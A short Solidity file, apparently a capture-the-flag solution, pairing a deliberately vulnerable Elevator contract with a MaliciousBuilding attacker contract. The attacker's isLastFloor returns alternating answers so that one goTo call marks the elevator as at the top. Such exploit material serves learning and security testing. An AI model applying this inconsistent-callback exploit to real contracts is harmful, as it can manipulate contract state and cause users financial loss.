// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract MaliciousBuilding {
    Elevator public el;
    bool public _switch = false;

    constructor(address elevatorContract) {
        el = Elevator(elevatorContract);
    }

    function hack() public {
        el.goTo(5);
    }

    function isLastFloor(uint) public returns (bool) {
        if (_switch == false) {
            _switch = true;
            return false;
        } else {
            _switch = false;
            return true;
        }
    }
}
